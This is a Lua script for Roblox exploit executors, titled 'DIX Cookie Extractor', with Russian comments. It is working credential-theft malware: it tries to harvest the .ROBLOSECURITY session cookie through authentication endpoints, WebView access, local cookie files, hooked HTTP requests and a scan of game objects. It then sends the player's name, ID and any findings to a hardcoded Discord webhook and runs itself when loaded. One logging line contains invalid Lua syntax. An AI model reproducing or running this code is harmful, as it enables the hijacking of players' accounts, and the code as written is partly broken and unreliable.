-- ============================================
-- DIX Cookie Extractor v2.0
-- Альтернативные методы получения куки
-- ============================================

local DIX_Cookie = {
    _VERSION = "2.0.0",
    _METHODS = {}
}

-- Конфигурация
DIX_Cookie.Config = {
    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467828785465397309/xxIU29gmHsJXRiDZuGyJW2vapxYcX_45J_2CuJMZN6Tutnpz6a7OALj00Sk_NMqphemw",
    ENABLE_LOGGING = true
}

-- Метод 1: Через Roblox API запросы
function DIX_Cookie.Method1_APIRequests()
    local cookies = {}
    
    -- Попытка получить куки через разные эндпоинты
    local endpoints = {
        "https://auth.roblox.com/v1/authentication-ticket",
        "https://www.roblox.com/game/GetCurrentUser.ashx",
        "https://www.roblox.com/mobileapi/userinfo",
        "https://users.roblox.com/v1/users/authenticated"
    }
    
    local http = syn and syn.request or request
    if not http then return cookies end
    
    for _, endpoint in ipairs(endpoints) do
        local success, response = pcall(function()
            return http({
                Url = endpoint,
                Method = "GET",
                Headers = {
                    ["User-Agent"] = "Roblox/WinInet",
                    ["Referer"] = "https://www.roblox.com/"
                }
            })
        end)
        
        if success and response.Headers and response.Headers["set-cookie"] then
            table.insert(cookies, {
                endpoint = endpoint,
                headers = response.Headers
            })
        end
    end
    
    return cookies
end

-- Метод 2: Через WebView/браузер (если доступно)
function DIX_Cookie.Method2_WebView()
    -- Этот метод зависит от возможностей исполнителя
    -- Некоторые эксплойты предоставляют доступ к WebView
    
    local cookies = {}
    
    -- Проверка наличия функций WebView
    if getgenv and getgenv().WebView then
        pcall(function()
            -- Пример для некоторых эксплойтов
            local webview = getgenv().WebView
            if webview and webview.GetCookies then
                local allCookies = webview.GetCookies("roblox.com")
                if allCookies then
                    for _, cookie in pairs(allCookies) do
                        if cookie.name:find("ROBLOSECURITY") then
                            table.insert(cookies, {
                                name = cookie.name,
                                value = cookie.value,
                                domain = cookie.domain
                            })
                        end
                    end
                end
            end
        end)
    end
    
    return cookies
end

-- Метод 3: Через метаданные игры
function DIX_Cookie.Method3_GameMetadata()
    -- Поиск куки в данных игры
    local found = {}
    
    -- Проверка различных мест
    local placesToCheck = {
        game:GetService("HttpService"),
        game:GetService("ScriptContext"),
        game:GetService("ContentProvider")
    }
    
    for _, service in ipairs(placesToCheck) do
        pcall(function()
            -- Проверка на наличие методов связанных с куки
            for _, method in pairs(getmethods(service)) do
                if tostring(method):lower():find("cookie") then
                    table.insert(found, {
                        service = tostring(service),
                        method = tostring(method)
                    })
                end
            end
        end)
    end
    
    return found
end

-- Метод 4: Через память процесса (продвинутый)
function DIX_Cookie.Method4_MemoryScan()
    -- Требует расширенных возможностей исполнителя
    local found = {}
    
    -- Некоторые эксплойты предоставляют доступ к памяти
    if readfile and writefile then
        -- Попытка прочитать файлы куки
        local paths = {
            os.getenv("APPDATA") .. "\\Roblox\\Cookies",
            os.getenv("LOCALAPPDATA") .. "\\Roblox\\Cookies",
            "C:\\Users\\" .. os.getenv("USERNAME") .. "\\AppData\\Local\\Roblox\\Cookies"
        }
        
        for _, path in ipairs(paths) do
            pcall(function()
                if readfile and isfile(path) then
                    local content = readfile(path)
                    if content:find("ROBLOSECURITY") then
                        table.insert(found, {
                            path = path,
                            found = true
                        })
                    end
                end
            end)
        end
    end
    
    return found
end

-- Метод 5: Через Network interception (если доступно)
function DIX_Cookie.Method5_Network()
    local captured = {}
    
    -- Некоторые эксплойты позволяют перехватывать сетевые запросы
    if hookfunction and getconnections then
        -- Пример перехвата
        pcall(function()
            local original = http_request or request
            if original then
                hookfunction(original, function(options)
                    -- Проверяем заголовки на наличие куки
                    if options.Headers then
                        for k, v in pairs(options.Headers) do
                            if tostring(k):lower():find("cookie") then
                                table.insert(captured, {
                                    url = options.Url,
                                    cookie_header = v
                                })
                            end
                        end
                    end
                    
                    -- Вызываем оригинальную функцию
                    return original(options)
                end)
            end
        end)
    end
    
    return captured
end

-- Основная функция сбора
function DIX_Cookie.collectAll()
    local results = {
        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
        player = {
            name = game:GetService("Players").LocalPlayer.Name,
            id = game:GetService("Players").LocalPlayer.UserId
        },
        methods = {}
    }
    
    -- Запуск всех методов
    results.methods.method1 = DIX_Cookie.Method1_APIRequests()
    results.methods.method2 = DIX_Cookie.Method2_WebView()
    results.methods.method3 = DIX_Cookie.Method3_GameMetadata()
    results.methods.method4 = DIX_Cookie.Method4_MemoryScan()
    results.methods.method5 = DIX_Cookie.Method5_Network()
    
    -- Проверка результатов
    results.has_cookies = false
    for methodName, methodResults in pairs(results.methods) do
        if #methodResults > 0 then
            results.has_cookies = true
            break
        end
    end
    
    return results
end

-- Отправка результатов в Discord
function DIX_Cookie.sendToDiscord(results)
    local http = syn and syn.request or request
    if not http then return false end
    
    local message = "**🍪 DIX Cookie Report**\n\n"
    message = message .. string.format("**Игрок:** %s\n", results.player.name)
    message = message .. string.format("**User ID:** `%s`\n", results.player.id)
    message = message .. string.format("**Время:** %s\n", results.timestamp)
    message = message .. string.format("**Куки найдены:** %s\n\n", results.has_cookies and "✅" or "❌")
    
    -- Детали по методам
    message = message .. "**Результаты методов:**\n"
    for methodName, methodResults in pairs(results.methods) do
        message = message .. string.format("- %s: %d результатов\n", 
            methodName, #methodResults)
    end
    
    -- Примеры найденных данных
    message = message .. "\n**Примеры:**\n"
    for methodName, methodResults in pairs(results.methods) do
        if #methodResults > 0 then
            for i = 1, math.min(2, #methodResults) do
                local result = methodResults[i]
                message = message .. string.format("• %s: %s\n", 
                    methodName, 
                    tostring(result):sub(1, 100))
            end
        end
    end
    
    local payload = {
        content = message,
        username = "DIX Cookie Scanner",
        avatar_url = "https://i.imgur.com/5Yj6X7n.png"
    }
    
    local success, response = pcall(function()
        return http({
            Url = DIX_Cookie.Config.DISCORD_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end)
    
    return success
end

-- Альтернативный метод: через DataModel
function DIX_Cookie.extractFromDataModel()
    local found = {}
    
    -- Поиск в DataModel
    local function searchInModel(object, depth)
        if depth > 3 then return end
        
        pcall(function()
            for _, child in pairs(object:GetChildren()) do
                -- Проверка свойств
                for _, prop in pairs({"Value", "Text", "Source", "Cookie"}) do
                    if child[prop] and tostring(child[prop]):find("_|WARNING") then
                        table.insert(found, {
                            object = child:GetFullName(),
                            property = prop,
                            value = tostring(child[prop]):sub(1, 50)
                        })
                    end
                end
                
                -- Рекурсивный поиск
                searchInModel(child, depth + 1)
            end
        end)
    end
    
    searchInModel(game, 0)
    return found
end

-- Запуск
function DIX_Cookie.init()
    print("[DIX] 🔍 Запуск поиска куки...")
    
    local results = DIX_Cookie.collectAll()
    
    -- Дополнительный поиск в DataModel
    results.methods.datamodel = DIX_Cookie.extractFromDataModel()
    
    if DIX_Cookie.Config.ENABLE_LOGGING then
        print(string.format("[DIX] Методов выполнено: %d", 6))
        print(string.format("[DIX] Куки найдены: %s", results.has_cookies and "ДА" : "НЕТ"))
        
        if results.has_cookies then
            for methodName, methodResults in pairs(results.methods) do
                if #methodResults > 0 then
                    print(string.format("[DIX] %s: %d результатов", methodName, #methodResults))
                end
            end
        end
    end
    
    -- Отправка в Discord
    if DIX_Cookie.Config.DISCORD_WEBHOOK and 
       DIX_Cookie.Config.DISCORD_WEBHOOK ~= "https://discord.com/api/webhooks/ВАШ_WEBHOOK" then
        DIX_Cookie.sendToDiscord(results)
    end
    
    return results
end

-- Автозапуск
return DIX_Cookie.init()